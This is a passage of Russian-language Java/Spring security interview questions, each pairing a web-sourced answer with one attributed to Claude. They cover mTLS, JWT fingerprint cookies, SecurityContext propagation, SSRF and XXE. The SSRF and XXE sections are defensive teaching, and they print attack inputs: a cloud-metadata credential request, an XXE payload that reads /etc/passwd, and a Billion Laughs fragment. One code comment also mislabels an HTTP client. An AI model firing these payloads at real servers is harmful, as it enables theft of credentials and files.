Источник: [AWS Secrets Manager best practices](https://docs.aws.amazon.com/secretsmanager/latest/userguide/best-practices.html) (docs.aws.amazon.com)

Java-клиент с кэшированием:

```java
// Подключение через AWS SDK с кэшированием
SecretsManagerClient client = SecretsManagerClient.builder()
    .region(Region.EU_CENTRAL_1)
    .build();

GetSecretValueRequest request = GetSecretValueRequest.builder()
    .secretId("prod/myapp/db-password")
    .build();

String secret = client.getSecretValue(request).secretString();
```

Плюсы:
- Нет операционной нагрузки (managed-сервис).
- Нативная интеграция с другими сервисами AWS (EKS, Lambda, RDS).
- Автоматическая ротация через Lambda.

Минусы:
- Vendor lock-in: привязка к AWS.
- При отсутствии кэширования — дополнительная задержка и стоимость каждого вызова API.

---

**Сравнительная таблица**

| Подход | Шифрование | Ротация | Production-grade | Сложность |
|--------|-----------|---------|-----------------|-----------|
| Environment Variables | Нет | Ручная | Нет (без доп. мер) | Низкая |
| Kubernetes Secrets | Только при настройке | Ручная | Условно (нужен etcd encryption) | Средняя |
| HashiCorp Vault | Да | Автоматическая, динамические секреты | Да | Высокая |
| AWS Secrets Manager | Да (KMS) | Автоматическая | Да | Низкая (managed) |

**Production-grade** считаются HashiCorp Vault и AWS Secrets Manager, так как они обеспечивают шифрование в покое и в транзите, автоматическую ротацию, полный аудит и детализированный контроль доступа. Kubernetes Secrets достигают этого уровня только при явном включении Encryption at Rest и внешнего хранилища. Переменные окружения допустимы только как транспортный механизм для передачи ссылок на секреты (например, ARN из Secrets Manager), но не для хранения самих значений.

---

### Вопрос 47. Что такое Mutual TLS (mTLS) и чем он отличается от обычного TLS? Опишите сценарий service-to-service аутентификации в микросервисах с использованием mTLS и объясните, как настроить его в Spring Boot.

**Категория:** Безопасность · **Уровень:** Senior

#### Оригинальный ответ из интернета
> Источник: [Why Mutual TLS (mTLS) Is Critical For Securing Microservices Communications In A Service Mesh](https://www.appviewx.com/blogs/why-mutual-tls-mtls-is-critical-for-securing-microservices-communications-in-a-service-mesh/) (appviewx.com)

Обычный TLS предполагает одностороннюю аутентификацию: только сервер предъявляет свой сертификат x.509, клиент его проверяет и принимает решение о доверии. mTLS расширяет этот протокол: обе стороны обязаны предъявить и взаимно проверить сертификаты.

Процесс mTLS-рукопожатия в сервисном меше:
1. Когда два микросервиса начинают взаимодействие, их sidecar-прокси обмениваются x.509-сертификатами.
2. Каждая сторона проверяет, что сертификат контрагента выпущен доверенным CA.
3. Sidecar-прокси проверяет политику безопасности: авторизован ли данный сервис взаимодействовать с целевым.
4. Только при успешной проверке обеих сторон устанавливается зашифрованный mTLS-канал.

Причины критической важности mTLS в микросервисах:
- **Снижение поверхности атаки**: один входящий north-south запрос может порождать сотни east-west транзакций между сервисами. mTLS предотвращает взаимодействие несанкционированных сервисов.
- **Защита данных**: шифрование в транзите защищает от перехвата и атак man-in-the-middle.
- **Zero Trust**: mTLS является транспортным фундаментом модели «никогда не доверяй, всегда проверяй».

#### Ответ от Claude

**Разница между TLS и mTLS**

| Аспект | TLS | mTLS |
|--------|-----|------|
| Аутентификация сервера | Да (сертификат сервера) | Да |
| Аутентификация клиента | Нет | Да (сертификат клиента) |
| Направление проверки | Одностороннее | Двустороннее |
| Типичное применение | HTTPS для браузеров, публичные API | Service-to-service внутри кластера |

В обычном TLS клиент знает, что говорит с «правильным» сервером, но сервер не знает, кто обращается к нему. В mTLS оба участника имеют криптографически верифицированные идентичности.

Источники: [appviewx.com](https://www.appviewx.com/blogs/why-mutual-tls-mtls-is-critical-for-securing-microservices-communications-in-a-service-mesh/), [zuplo.com](https://zuplo.com/learning-center/mtls-authentication-in-spring-boot-microservices)

---

**Сценарий service-to-service аутентификации**

Предположим, есть два сервиса: `order-service` и `payment-service`. Цель: только `order-service` может вызывать `payment-service`, причём `payment-service` должен быть уверен в идентичности вызывающего.

1. **PKI**: создаётся внутренний CA (Certificate Authority). Каждый сервис получает сертификат, подписанный этим CA.
2. **Keystore**: каждый сервис хранит свой приватный ключ и сертификат (keystore).
3. **Truststore**: каждый сервис хранит сертификат CA, которому доверяет (truststore).
4. При запросе от `order-service` к `payment-service`:
   - `order-service` (клиент) предъявляет свой сертификат.
   - `payment-service` (сервер) проверяет сертификат клиента через truststore.
   - `payment-service` предъявляет свой сертификат.
   - `order-service` проверяет сертификат сервера через свой truststore.
   - Устанавливается двусторонний зашифрованный канал.

---

**Настройка в Spring Boot**

Сторона сервера (`payment-service`) — `application.yml`:

```yaml
server:
  port: 8443
  ssl:
    enabled: true
    key-store: classpath:certs/server.p12
    key-store-type: PKCS12
    key-store-password: ${SSL_KEYSTORE_PASSWORD}
    key-alias: payment-service
    trust-store: classpath:certs/truststore.p12
    trust-store-type: PKCS12
    trust-store-password: ${SSL_TRUSTSTORE_PASSWORD}
    client-auth: need
```

Параметр `client-auth: need` — ключевой: он требует, чтобы клиент обязательно предъявил сертификат. Значение `want` запрашивает сертификат, но не требует. `none` отключает проверку (обычный TLS).

Сторона клиента (`order-service`) — настройка `RestTemplate` или `WebClient`:

```java
@Bean
public RestTemplate restTemplate() throws Exception {
    SSLContext sslContext = SSLContextBuilder.create()
        .loadKeyMaterial(
            new File("order-service.p12"), 
            "keystore-password".toCharArray(),
            "key-password".toCharArray()
        )
        .loadTrustMaterial(
            new File("truststore.p12"),
            "truststore-password".toCharArray()
        )
        .build();

    HttpClient httpClient = HttpClients.custom()
        .setSSLContext(sslContext)
        .build();

    HttpComponentsClientHttpRequestFactory factory =
        new HttpComponentsClientHttpRequestFactory(httpClient);

    return new RestTemplate(factory);
}
```

Источник конфигурации: [mTLS Authentication in Spring Boot Microservices](https://zuplo.com/learning-center/mtls-authentication-in-spring-boot-microservices) (zuplo.com)

---

**mTLS в Kubernetes через Istio**

В production-кластерах mTLS обычно реализуется на уровне сервисного меша (Istio, Linkerd), а не в коде приложения. Istio автоматически выпускает и ротирует сертификаты для каждого пода через SPIFFE/SPIRE, что снимает необходимость управлять PKI вручную.

```yaml
apiVersion: security.istio.io/v1beta1
kind: PeerAuthentication
metadata:
  name: default
  namespace: production
spec:
  mtls:
    mode: STRICT
```

Это включает строгий mTLS для всего namespace: любой сервис без валидного сертификата получит отказ в соединении.

**Расхождение между источниками**: Baeldung и zuplo.com описывают настройку mTLS непосредственно в Spring Boot через `server.ssl.client-auth`. Appviewx.com и другие источники по Kubernetes-окружениям рекомендуют делегировать mTLS сервисному мешу. Оба подхода верны для разных сценариев: первый — для сервисов вне Kubernetes или при отсутствии меша; второй — для cloud-native деплоймента в Kubernetes.

---

### Вопрос 48. Что такое атака JWT Token Sidejacking (перехват токена)? Как механизм fingerprint-cookie (user context) по рекомендации OWASP защищает от неё, и почему HttpOnly-флаг у куки является ключевым элементом этой защиты?

**Категория:** Безопасность · **Уровень:** Senior

#### Оригинальный ответ из интернета
> Источник: [JSON Web Token for Java — OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html) (cheatsheetseries.owasp.org)

**Token Sidejacking** — атака, при которой злоумышленник перехватывает или похищает JWT-токен и использует его для доступа к системе от имени легитимного пользователя.

Для защиты OWASP рекомендует добавлять «user context» (контекст пользователя) к токену. Механизм состоит из двух компонентов:

1. **Случайная строка** генерируется при аутентификации и отправляется клиенту в виде защищённой куки с флагами `HttpOnly + Secure + SameSite`.
2. В токен записывается не сама строка, а её **SHA-256 хэш** — чтобы злоумышленник, укравший токен через XSS, не мог прочитать значение куки и воссоздать пару.

Java-код создания токена (из OWASP Cheat Sheet):

```java
// Генерация fingerprint
byte[] randomFgp = new byte[50];
secureRandom.nextBytes(randomFgp);
String userFingerprint = DatatypeConverter.printHexBinary(randomFgp);

// Отправка куки с флагами безопасности
String fingerprintCookie = "__Secure-Fgp=" + userFingerprint
                          + "; SameSite=Strict; HttpOnly; Secure";
response.addHeader("Set-Cookie", fingerprintCookie);

// Хэширование для записи в токен
MessageDigest digest = MessageDigest.getInstance("SHA-256");
byte[] userFingerprintDigest = digest.digest(userFingerprint.getBytes("utf-8"));
String userFingerprintHash = DatatypeConverter.printHexBinary(userFingerprintDigest);

// Создание JWT с хэшем fingerprint
String token = JWT.create()
    .withSubject(login)
    .withClaim("userFingerprint", userFingerprintHash)
    .sign(Algorithm.HMAC256(keyHMAC));
```

Java-код валидации токена:

```java
// Извлечение fingerprint из куки
String userFingerprint = null;
if (request.getCookies() != null) {
    Optional<Cookie> cookie = Arrays.stream(request.getCookies())
        .filter(c -> "__Secure-Fgp".equals(c.getName()))
        .findFirst();
    if (cookie.isPresent()) {
        userFingerprint = cookie.get().getValue();
    }
}

// Хэширование полученного значения
MessageDigest digest = MessageDigest.getInstance("SHA-256");
byte[] userFingerprintDigest = digest.digest(userFingerprint.getBytes("utf-8"));
String userFingerprintHash = DatatypeConverter.printHexBinary(userFingerprintDigest);

// Верификация: JWT должен содержать соответствующий хэш
JWTVerifier verifier = JWT.require(Algorithm.HMAC256(keyHMAC))
    .withClaim("userFingerprint", userFingerprintHash)
    .build();

DecodedJWT decodedToken = verifier.verify(token);
```

#### Ответ от Claude

**Что такое JWT Token Sidejacking**

JWT хранится на клиенте (localStorage, sessionStorage или память браузера). Если злоумышленник получает доступ к токену — через XSS-атаку, компрометацию сети (при отсутствии HTTPS), утечку логов или перехват трафика — он может использовать его напрямую, так как JWT является самодостаточным (self-contained): сервер не хранит состояния сессии и не может отличить легитимного пользователя от атакующего, предъявившего тот же токен.

Источник: [OWASP JWT Cheat Sheet for Java](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)

---

**Механизм fingerprint-cookie**

OWASP предлагает привязать JWT к конкретному браузеру пользователя через механизм «user context»:

**Шаг 1. При аутентификации:**
- Сервер генерирует криптографически случайную строку (fingerprint).
- Вычисляет SHA-256 хэш от этой строки.
- Записывает хэш в claims JWT (`userFingerprint`).
- Отправляет клиенту оригинальную (нехэшированную) строку в куке `__Secure-Fgp` с флагами `HttpOnly; Secure; SameSite=Strict`.

**Шаг 2. При каждом запросе:**
- Браузер автоматически отправляет куку вместе с JWT.
- Сервер извлекает значение куки, вычисляет SHA-256.
- Сравнивает результат с полем `userFingerprint` в JWT.
- Если значения не совпадают — запрос отклоняется.

---

**Почему HttpOnly — ключевой флаг**

`HttpOnly` запрещает доступ к куке из JavaScript. Это прямо противодействует XSS:

- **Без HttpOnly**: XSS-скрипт может выполнить `document.cookie` и прочитать fingerprint. Злоумышленник получит и JWT (из localStorage), и fingerprint (из куки) — и сможет воспроизвести запрос.
- **С HttpOnly**: даже если XSS-скрипт похищает JWT из localStorage, он не может прочитать `__Secure-Fgp` куку. Похищенный JWT без fingerprint-куки не проходит валидацию на сервере.

Таким образом, HttpOnly создаёт асимметрию: легитимный браузер пользователя автоматически отправляет куку вместе с запросом (браузер делает это на уровне HTTP-протокола, минуя JavaScript), а атакующий, использующий XSS, получить куку не может.

---

**Почему хэш, а не оригинальное значение в токене**

Если бы в JWT хранился оригинальный fingerprint (без хэширования), злоумышленник мог бы:
1. Украсть JWT (из localStorage через XSS).
2. Прочитать fingerprint из payload JWT (JWT только подписан, но не зашифрован).
3. Подделать куку с этим значением в своём браузере.

SHA-256 хэш в токене разрывает эту цепочку: зная хэш из токена, нельзя восстановить оригинальный fingerprint для создания куки.

---

**Дополнительные флаги куки**

| Флаг | Роль |
|------|------|
| `HttpOnly` | Блокирует чтение через JavaScript (защита от XSS) |
| `Secure` | Передача только по HTTPS (защита от перехвата по сети) |
| `SameSite=Strict` | Блокирует отправку куки в cross-site запросах (защита от CSRF) |
| `__Secure-` префикс | Браузер принимает куку только если она установлена по HTTPS |

Источник: [OWASP JSON Web Token for Java Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html) (cheatsheetseries.owasp.org)

---

**Итоговая схема защиты**

```
Легитимный запрос:
  Browser → [JWT в Authorization header] + [__Secure-Fgp кука (автоматически)] → Server
  Server: SHA256(cookie_value) == jwt.userFingerprint → OK

Атака после кражи JWT через XSS:
  Attacker → [украденный JWT] + [нет куки, т.к. HttpOnly блокирует JS-доступ] → Server
  Server: fingerprint отсутствует → REJECT
```

Механизм эффективен, поскольку требует одновременного наличия JWT и привязанной HttpOnly-куки. Похитить оба артефакта через XSS невозможно именно благодаря флагу HttpOnly.

---

### Вопрос 49. Как устроен SecurityContextHolder в Spring Security с точки зрения потоков (ThreadLocal)? Почему стандартный SecurityContextHolder не работает с @Async-методами и как правильно передать SecurityContext в дочерний поток?

**Категория:** Безопасность · **Уровень:** Middle

#### Оригинальный ответ из интернета
> Источник: [Spring Security Context Propagation to Threads — HowToDoInJava](https://howtodoinjava.com/spring-security/spring-security-context-propagation/)

По умолчанию `SecurityContextHolder` использует стратегию `MODE_THREADLOCAL`: контекст безопасности хранится в переменной типа `ThreadLocal`, что делает его доступным в любом методе, вызываемом на том же потоке, без явной передачи в качестве аргумента. Каждый новый поток при этом не получает копию родительского контекста.

Когда Spring выполняет метод, помеченный `@Async`, он создаёт новый поток из пула. Поскольку `ThreadLocal` не наследуется дочерними потоками, `Authentication` в новом потоке оказывается `null`, и обращение к `SecurityContextHolder.getContext().getAuthentication()` бросает `NullPointerException`.

**Три способа решения:**

1. **`MODE_INHERITABLETHREADLOCAL`** — при старте приложения задаётся стратегия:
   ```java
   SecurityContextHolder.setStrategyName(
       SecurityContextHolder.MODE_INHERITABLETHREADLOCAL);
   ```
   Дочерний поток автоматически получает копию родительского контекста через `InheritableThreadLocal`. Однако при использовании пулов потоков этот способ **опасен**: поток берётся из пула уже с «чужим» контекстом, установленным в момент его создания, и может обслуживать запрос другого пользователя.

2. **`DelegatingSecurityContextAsyncTaskExecutor`** — рекомендуемый подход. Объявляется бин-исполнитель, который оборачивает каждый `Runnable` в `DelegatingSecurityContextRunnable`, а каждый `Callable` — в `DelegatingSecurityContextCallable`. Контекст захватывается в момент **отправки** задачи и восстанавливается перед её выполнением:
   ```java
   @Bean
   public AsyncTaskExecutor taskExecutor() {
       ThreadPoolTaskExecutor executor = new ThreadPoolTaskExecutor();
       executor.initialize();
       return new DelegatingSecurityContextAsyncTaskExecutor(executor);
   }
   ```

3. **Ручная обёртка** — для произвольных потоков:
   ```java
   Runnable original = () -> { /* использует SecurityContextHolder */ };
   Runnable wrapped = new DelegatingSecurityContextRunnable(original);
   new Thread(wrapped).start();
   ```

#### Ответ от Claude

**Как устроен SecurityContextHolder.**

`SecurityContextHolder` — центральный компонент хранения информации об аутентификации. Внутри он делегирует хранение стратегии (`SecurityContextHolderStrategy`), реализация которой выбирается по имени:

| Стратегия | Хранилище | Когда применять |
|---|---|---|
| `MODE_THREADLOCAL` (по умолчанию) | `ThreadLocal` | Стандартные Servlet-приложения (один запрос — один поток) |
| `MODE_INHERITABLETHREADLOCAL` | `InheritableThreadLocal` | Явно порождаемые дочерние потоки без повторного использования |
| `MODE_GLOBAL` | статическое поле | Standalone-приложения (Swing и т.п.) |

При завершении обработки запроса `FilterChainProxy` автоматически очищает контекст, предотвращая утечки между запросами.

**Почему @Async не работает со стандартной стратегией.**

`@Async` запускает метод на отдельном потоке из пула (`SimpleAsyncTaskExecutor` или настроенного пула). `ThreadLocal` хранит данные исключительно в текущем потоке и не копируется при создании нового. В результате в `@Async`-методе `SecurityContextHolder.getContext().getAuthentication()` возвращает `null`.

**Почему `MODE_INHERITABLETHREADLOCAL` небезопасен с пулами потоков.**

`InheritableThreadLocal` копирует значение при создании потока (`new Thread(...)`). Поток из пула создаётся один раз и переиспользуется многократно. Это означает, что он несёт контекст того запроса, во время которого был впервые создан — и этот «чужой» контекст доступен всем последующим задачам, выполняемым на данном потоке. Это прямая угроза безопасности: один пользователь может получить привилегии другого.

**Правильное решение: `DelegatingSecurityContextAsyncTaskExecutor`.**

Класс перехватывает задачу в момент её постановки в очередь, захватывает текущий `SecurityContext` и восстанавливает его непосредственно перед исполнением на рабочем потоке. После завершения задачи контекст очищается. Контекст привязан к задаче, а не к потоку:

```java
@Configuration
@EnableAsync
public class AsyncConfig implements AsyncConfigurer {

    @Override
    public Executor getAsyncExecutor() {
        ThreadPoolTaskExecutor executor = new ThreadPoolTaskExecutor();
        executor.setCorePoolSize(5);
        executor.setMaxPoolSize(10);
        executor.initialize();
        return new DelegatingSecurityContextAsyncTaskExecutor(executor);
    }
}
```

Для одноразовых задач доступны:
- `DelegatingSecurityContextRunnable` — обёртка над `Runnable`
- `DelegatingSecurityContextCallable<T>` — обёртка над `Callable<T>`
- `DelegatingSecurityContextExecutor` / `DelegatingSecurityContextExecutorService` — для произвольных пулов

**Расхождения между источниками.** Некоторые ресурсы представляют `MODE_INHERITABLETHREADLOCAL` как рабочее решение без оговорок. Официальный трекер Spring Security (issue #6856) и документация явно предупреждают: использование этого режима с пулами потоков опасно и не рекомендуется. Рекомендованный подход — `DelegatingSecurityContextAsyncTaskExecutor`.

---

### Вопрос 50. Как Spring Security работает в реактивном стеке (WebFlux)? Чем ReactiveSecurityContextHolder отличается от SecurityContextHolder и почему вызов SecurityContextHolder.getContext() внутри WebFlux-хендлера вернёт пустой контекст?

**Категория:** Безопасность · **Уровень:** Senior

#### Оригинальный ответ из интернета
> Источник: [Getting the security context in reactive spring applications — TheCodingAnalyst](https://www.thecodinganalyst.com/knowledgebase/reactive-security-context-holder/)

`ReactiveSecurityContextHolder` — утилитный класс из реактивного стека Spring Security, разработанный для работы с Project Reactor. В отличие от `SecurityContextHolder`, который хранит контекст в `ThreadLocal`, `ReactiveSecurityContextHolder` хранит его в `Mono<SecurityContext>`, путешествующем через реактивный пайплайн.

Контекст безопасности добавляется фреймворком WebFlux в основной реактивный поток при обработке методов `@RestController` автоматически. Однако при ветвлении (создании нового независимого потока через `Mono.delay()` или `Flux.create()`) новый поток не имеет представления об оригинальном контексте, и `ReactiveSecurityContextHolder` не может вернуть нужный контекст.

Для решения требуется вручную передать контекст с помощью `contextWrite`:

```java
ReactiveSecurityContextHolder.getContext()
    .doOnNext(ctx ->
        Mono.delay(Duration.ofSeconds(5))
            .then(performOurBusiness())
            .contextWrite(Context.of(SecurityContext.class, Mono.just(ctx)))
            .subscribe()
    )
```

Получить контекст в реактивном обработчике:

```java
ReactiveSecurityContextHolder.getContext()
    .map(SecurityContext::getAuthentication)
    .map(Authentication::getName)
    .flatMap(username -> /* бизнес-логика */);
```

#### Ответ от Claude

**Почему ThreadLocal не работает в реактивном стеке.**

Реактивные приложения (Project Reactor, WebFlux) выполняют этапы пайплайна на разных потоках из небольшого пула (по умолчанию — `Schedulers.parallel()` с числом потоков равным числу CPU). Один HTTP-запрос может переключиться между несколькими потоками до завершения. `ThreadLocal` привязан к конкретному потоку — после переключения данные из него недоступны. Поэтому `SecurityContextHolder.getContext()` в WebFlux-хендлере возвращает пустой контекст: он читает `ThreadLocal` потока из пула планировщика, в котором никогда не устанавливался `SecurityContext`.

**Как Spring Security решает эту проблему: Reactor Context.**

Project Reactor предоставляет механизм `Context` — неизменяемую карту «ключ-значение», неразрывно связанную с реактивной цепочкой операторов (а не с потоком). Context передаётся «снизу вверх» по цепочке: подписчик предоставляет контекст, операторы читают его через специальный API.

Компонент `ReactorContextWebFilter` (реализует `WebFilter`) является точкой входа: он запрашивает `SecurityContext` из `ServerSecurityContextRepository`, помещает его в Reactor Context через `contextWrite(ReactiveSecurityContextHolder.withSecurityContext(...))` и передаёт управление следующему фильтру в цепочке. Все последующие операторы реактивного пайплайна имеют доступ к этому контексту.

**ReactiveSecurityContextHolder vs SecurityContextHolder.**

| Критерий | SecurityContextHolder | ReactiveSecurityContextHolder |
|---|---|---|
| Хранилище | `ThreadLocal` (или `InheritableThreadLocal`) | Reactor `Context` |
| Привязка | К потоку | К реактивной цепочке подписки |
| Тип возврата | `SecurityContext` (синхронно) | `Mono<SecurityContext>` |
| Совместимость | Servlet / Blocking | WebFlux / Non-blocking |
| Настройка | `SecurityContextHolder.setStrategyName(...)` | `SecurityWebFilterChain` + `ReactorContextWebFilter` |

**API ReactiveSecurityContextHolder.**

```java
// Получить контекст (возвращает Mono — не блокирует)
Mono<SecurityContext> ctx = ReactiveSecurityContextHolder.getContext();

// Записать контекст в Reactor Context (для передачи дальше по цепочке)
Context ctxWithSecurity = ReactiveSecurityContextHolder
    .withSecurityContext(Mono.just(securityContext));

// Удобный метод: записать Authentication напрямую
Context ctxWithAuth = ReactiveSecurityContextHolder
    .withAuthentication(authentication);

// Очистить контекст
Function<Context, Context> clear = ReactiveSecurityContextHolder.clearContext();
```

**Типичный паттерн получения Principal в WebFlux-контроллере.**

```java
@GetMapping("/profile")
public Mono<String> profile() {
    return ReactiveSecurityContextHolder.getContext()
        .map(SecurityContext::getAuthentication)
        .map(Authentication::getName);
}
```

**Почему SecurityContextHolder.getContext() пуст в WebFlux.**

1. `SecurityContextHolder` использует `ThreadLocal` на потоке, на котором вызывается.
2. WebFlux-хендлеры выполняются на потоках Netty/Reactor, которые никогда не проходили через `SecurityContextPersistenceFilter` или аналог Servlet-стека.
3. `ReactorContextWebFilter` кладёт `SecurityContext` в Reactor Context, а не в `ThreadLocal`.
4. Следовательно, `SecurityContextHolder.getContext()` читает пустой `ThreadLocal` и возвращает пустой контекст.

**Ловушка: форкнутые потоки внутри реактивного пайплайна.**

Если внутри WebFlux-хендлера создаётся новый независимый реактивный поток (например, `Mono.fromSupplier(...)` без `contextWrite`, `Mono.create(...)`, или подписка с `subscribe()` без передачи контекста), этот поток не получает Reactor Context родительского пайплайна. `ReactiveSecurityContextHolder.getContext()` вернёт пустой `Mono`. Решение — явно передать контекст через `contextWrite`:

```java
return ReactiveSecurityContextHolder.getContext()
    .flatMap(ctx ->
        someIndependentMono()
            .contextWrite(ReactiveSecurityContextHolder.withSecurityContext(Mono.just(ctx)))
    );
```

**Настройка безопасности в WebFlux.**

В отличие от Servlet-стека (`SecurityFilterChain`), в WebFlux используется `SecurityWebFilterChain`:

```java
@Bean
public SecurityWebFilterChain securityFilterChain(ServerHttpSecurity http) {
    return http
        .authorizeExchange(ex -> ex.anyExchange().authenticated())
        .httpBasic(withDefaults())
        .build();
}
```

Вместо `UserDetailsService` реализуется `ReactiveUserDetailsService`, все операции возвращают `Mono` или `Flux`.

---

### Вопрос 51. Что такое SSRF (Server-Side Request Forgery)? Почему эта атака особенно опасна в облачных окружениях (AWS, GCP) и как защититься от неё в Java-приложении?

**Категория:** Безопасность · **Уровень:** Middle

#### Оригинальный ответ из интернета
> Источник: [Server-Side Request Forgery Prevention Cheat Sheet — OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)

SSRF — это атака, при которой злоумышленник заставляет сервер выполнять HTTP-запросы к ресурсам, к которым он не должен иметь доступа: внутренней сети, системным сервисам или облачному endpoint метаданных.

Типичные векторы: функционал загрузки аватара по URL, настройка вебхуков, API для получения контента по ссылке, взаимодействие между микросервисами.

**Защита на уровне приложения (Java):**

Для IP-адресов — использовать валидацию из Apache Commons Validator, устойчивую к обходу через hex/octal-кодирование:
```java
if (InetAddressValidator.getInstance().isValid(userInput)) {
    // Проверка против белого списка разрешённых IP
}
```

Для доменных имён — `DomainValidator.isValid()`, затем сверка с белым списком.

**Обязательно:** отключить следование редиректам в HTTP-клиенте, иначе атакующий обойдёт валидацию через цепочку редиректов.

**Минимальный deny-list** (если белый список невозможен): `169.254.169.254`, `metadata.amazonaws.com`, `127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`.

#### Ответ от Claude

**Что такое SSRF**

SSRF (Server-Side Request Forgery, подделка запроса на стороне сервера) — атака, при которой злоумышленник использует уязвимое приложение как прокси для отправки запросов к ресурсам, недоступным напрямую. Сервер выполняет запрос от своего имени с сетевыми привилегиями серверной среды.

**Почему SSRF особенно опасна в облаке**

В AWS, GCP, Azure каждый инстанс имеет доступ к endpoint метаданных по адресу `169.254.169.254` (link-local). Через него можно получить временные IAM-учётные данные, приватный IP, SSH-ключи, конфигурацию:

```
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Role
```

Ответ содержит `AccessKeyId`, `SecretAccessKey`, `Token` — с ними атакующий получает полный доступ к AWS-аккаунту с правами роли инстанса. Это означает потенциальное владение всей облачной инфраструктурой.

**Примеры уязвимого кода:**

```java
// УЯЗВИМО: прямое использование URL из запроса
@PostMapping("/fetch")
public String fetchContent(@RequestParam String url) throws Exception {
    URL targetUrl = new URL(url);
    URLConnection connection = targetUrl.openConnection();
    return new String(connection.getInputStream().readAllBytes());
}
// Атака: url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Защита: принцип белого списка (allowlist)**

Белый список — основной рекомендуемый подход OWASP. Приложение должно разрешать запросы только к заранее известному набору доменов/IP:

```java
private static final Set<String> ALLOWED_DOMAINS = Set.of(
    "api.trusted-partner.com",
    "cdn.example.com"
);

public void validateUrl(String userUrl) throws SecurityException {
    try {
        URL url = new URL(userUrl);
        String host = url.getHost().toLowerCase();

        if (!ALLOWED_DOMAINS.contains(host)) {
            throw new SecurityException("URL not in allowlist: " + host);
        }

        // Дополнительно: резолвим DNS и проверяем итоговый IP
        InetAddress address = InetAddress.getByName(host);
        if (address.isLoopbackAddress() || address.isSiteLocalAddress()
                || address.isLinkLocalAddress()) {
            throw new SecurityException("Resolved to private IP: " + address);
        }
    } catch (MalformedURLException | UnknownHostException e) {
        throw new SecurityException("Invalid URL", e);
    }
}
```

**Отключение редиректов в HTTP-клиенте:**

```java
// Apache HttpClient — запрет редиректов
HttpClient client = HttpClient.newBuilder()
    .followRedirects(HttpClient.Redirect.NEVER)
    .build();
```

Без этой меры атакующий может создать редирект-цепочку: публичный домен → `http://169.254.169.254/`, обходя проверку hostname.

**Сетевой уровень защиты**

В продакшне SSRF-защита обязательна и на сетевом уровне: правила IAM, Security Groups, Network Policies (Kubernetes), сетевая сегментация. Для AWS IMDSv2 требует PUT-запрос с TTL-заголовком перед получением токена — это не позволяет простому GET-запросу получить метаданные.

**Расхождений между источниками не обнаружено.** OWASP рекомендует белый список как основной метод, сетевую сегментацию — как обязательный второй эшелон.

---

### Вопрос 52. Что такое XXE (XML External Entity) injection? Почему большинство Java XML-парсеров уязвимы по умолчанию и как правильно отключить обработку внешних сущностей?

**Категория:** Безопасность · **Уровень:** Middle

#### Оригинальный ответ из интернета
> Источник: [XML External Entity Prevention Cheat Sheet — OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)

XXE-атака происходит, когда ненадёжный XML-ввод со ссылкой на внешнюю сущность обрабатывается слабо сконфигурированным XML-парсером.

Атака может привести к:
- раскрытию данных (чтению локальных файлов через `file://`)
- Server-Side Request Forgery (SSRF через внешние URL)
- Denial of Service (Billion Laughs атака через рекурсивные сущности)
- сканированию внутренних портов

Самый безопасный способ предотвращения — **полностью отключить DTD**. Это предотвращает как XXE, так и Billion Laughs:

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```

Если полное отключение DTD невозможно, отключить только внешние сущности:
```java
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

Для XMLInputFactory (StAX):
```java
xmlInputFactory.setProperty(XMLInputFactory.SUPPORT_DTD, false);
xif.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
```

Большинство Java XML-парсеров имеют XXE включённым по умолчанию.

#### Ответ от Claude

**Что такое XXE**

XXE (XML External Entity Injection) — атака на приложения, которые принимают и парсят XML. XML-спецификация поддерживает «внешние сущности» (external entities) — ссылки на внешние ресурсы, встраиваемые в документ. Если парсер обрабатывает их без ограничений, атакующий может читать произвольные файлы с сервера, инициировать SSRF-запросы или вызвать DoS.

**Пример атаки: чтение /etc/passwd**

Атакующий отправляет следующий XML:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
</user>
```

Если парсер обрабатывает external entities, значение `&xxe;` будет заменено содержимым файла `/etc/passwd`, которое окажется в ответе сервера или в логах.

**Billion Laughs (DoS)**

Рекурсивные сущности без внешних ресурсов вызывают экспоненциальный рост памяти:
```xml
<!ENTITY a "aaaaaaaa">
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;">
<!-- продолжается до &j; — финальный размер в памяти: миллиарды символов -->
```

**Почему Java-парсеры уязвимы по умолчанию**

Исторически XML-спецификация поддерживала DTD и external entities как стандартные функции. Java-реализации (`DocumentBuilderFactory`, `SAXParserFactory`, `XMLInputFactory`, JAXB) включают их по умолчанию из соображений обратной совместимости. Разработчики нередко не знают об этих умолчаниях.

**Защита по каждому парсеру:**

**DocumentBuilderFactory:**
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
// Полный запрет DTD — наиболее строгий вариант
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
// Если DTD нужен — отключить только external entities
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
DocumentBuilder db = dbf.newDocumentBuilder();
```

**SAXParserFactory:**
```java
SAXParserFactory spf = SAXParserFactory.newInstance();
spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
spf.setFeature("http://xml.org/sax/features/external-general-entities", false);
spf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

**XMLInputFactory (StAX / JAXB):**
```java
XMLInputFactory xif = XMLInputFactory.newFactory();
